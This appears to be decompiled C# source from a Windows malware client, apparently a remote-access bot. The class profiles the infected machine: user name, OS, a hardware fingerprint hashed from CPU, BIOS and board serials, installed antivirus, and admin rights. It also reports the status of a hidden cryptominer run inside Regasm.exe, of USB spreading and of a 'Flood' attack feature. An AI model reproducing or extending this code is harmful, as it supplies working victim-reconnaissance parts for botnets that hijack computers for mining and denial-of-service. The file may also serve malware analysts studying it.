using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;
using A;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns20;

namespace ns15;

public class GClass15
{
	private static object object_0 = GClass20.string_4;

	internal static object object_1;

	public static object smethod_0()
	{
		try
		{
			return Operators.ConcatenateObject(Operators.ConcatenateObject(smethod_1(), (object)"_"), (object)smethod_5());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object smethod_1()
	{
		try
		{
			return Environment.UserName;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object smethod_2()
	{
		try
		{
			return ((ServerComputer)B.Computer).get_Info().get_OSFullName().Replace("Microsoft", "")
				.Replace("Windows", "Win")
				.Replace("®", "")
				.Replace("™", "")
				.Replace("  ", " ")
				.Replace(" Win", "Win");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "Unkown";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object smethod_3()
	{
		try
		{
			if (Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE")!.Contains("64"))
			{
				return "x64";
			}
			return "x86";
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "*";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string smethod_4()
	{
		try
		{
			FileInfo fileInfo = new FileInfo(Application.get_ExecutablePath());
			return fileInfo.LastWriteTime.ToString("dd/MM/yyy HH:mm:ss tt");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string smethod_5()
	{
		try
		{
			string text = A("Win32_Processor", "ProcessorId");
			text = text + "-" + A("Win32_BIOS", "SerialNumber");
			text = text + "-" + A("Win32_BaseBoard", "SerialNumber");
			text = text + "-" + A("Win32_VideoController", "Name");
			return smethod_6(text);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static string A(string string_0, string string_1)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Expected O, but got Unknown
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		try
		{
			string text = "";
			ManagementClass val = new ManagementClass(string_0);
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = instances.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					if (Operators.CompareString(text, "", false) == 0)
					{
						try
						{
							text = ((ManagementBaseObject)val2).get_Item(string_1).ToString();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
							continue;
						}
						break;
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return text;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			string result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string smethod_6(string string_0)
	{
		try
		{
			MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
			byte[] array = mD5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(string_0));
			StringBuilder stringBuilder = new StringBuilder();
			int num = array.Length - 1;
			for (int i = 10; i <= num; i++)
			{
				stringBuilder.Append(array[i].ToString("x2"));
			}
			return stringBuilder.ToString().ToUpper();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object smethod_7()
	{
		if (GClass20.bool_0)
		{
			try
			{
				if (Operators.CompareString(C.b("USB"), (string)null, false) == 0)
				{
					C.a("USB", "Not ready");
					return C.b("USB");
				}
				return C.b("USB");
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				object result = "Error";
				ProjectData.ClearProjectError();
				return result;
			}
		}
		if (!GClass20.bool_0 && !GClass20.bool_1)
		{
			return "Disabled";
		}
		return "Not ready";
	}

	public static string smethod_8()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Expected O, but got Unknown
		try
		{
			string text = null;
			ManagementObjectSearcher val = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "SELECT * FROM AntivirusProduct");
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val2.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					text = ((ManagementBaseObject)val3).get_Item("displayName").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (Operators.CompareString(text, string.Empty, false) == 0)
			{
				text = "N/A";
			}
			return text.ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "N/A";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static bool smethod_9()
	{
		try
		{
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
			if (windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
			{
				return true;
			}
			return false;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string smethod_10()
	{
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_002f: Expected O, but got Unknown
		//IL_004a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Expected O, but got Unknown
		string result = default(string);
		try
		{
			Process[] processesByName = Process.GetProcessesByName("Regasm");
			if (processesByName.Length > 0)
			{
				try
				{
					string text = string.Format("select CommandLine from Win32_Process where Name='{0}'", "Regasm.exe");
					ManagementObjectSearcher val = new ManagementObjectSearcher(text);
					ManagementObjectCollection val2 = val.Get();
					ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
					try
					{
						enumerator = val2.GetEnumerator();
						while (enumerator.MoveNext())
						{
							ManagementObject val3 = (ManagementObject)enumerator.get_Current();
							if (((ManagementBaseObject)val3).get_Item("CommandLine").ToString()!.Contains("-B"))
							{
								result = "Minning...";
								return result;
							}
						}
						return result;
					}
					finally
					{
						((IDisposable)enumerator)?.Dispose();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
					return result;
				}
			}
			result = smethod_12();
			return result;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object smethod_11()
	{
		try
		{
			if (Operators.CompareString(C.b("Flood"), (string)null, false) == 0)
			{
				C.a("Flood", " ");
			}
			return C.b("Flood");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string smethod_12()
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		try
		{
			ManagementObject val = new ManagementObject("Win32_Processor.deviceid=\"CPU0\"");
			val.Get();
			if (((ManagementBaseObject)val).get_Item("Name").ToString()!.Contains("Intel"))
			{
				return ((ManagementBaseObject)val).get_Item("Name").ToString()!.Replace("(R)", "").Replace("Core(TM)", "").Replace("CPU", "");
			}
			return ((ManagementBaseObject)val).get_Item("Name").ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Unknow";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string smethod_13()
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder();
			string[] directories = Directory.GetDirectories(RuntimeEnvironment.GetRuntimeDirectory().Substring(0, 34));
			foreach (string text in directories)
			{
				if (text.Contains("v4.0"))
				{
					stringBuilder.Append("v4.0");
				}
				else if (text.Contains("v2.0"))
				{
					stringBuilder.Append("");
				}
			}
			return stringBuilder.ToString();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
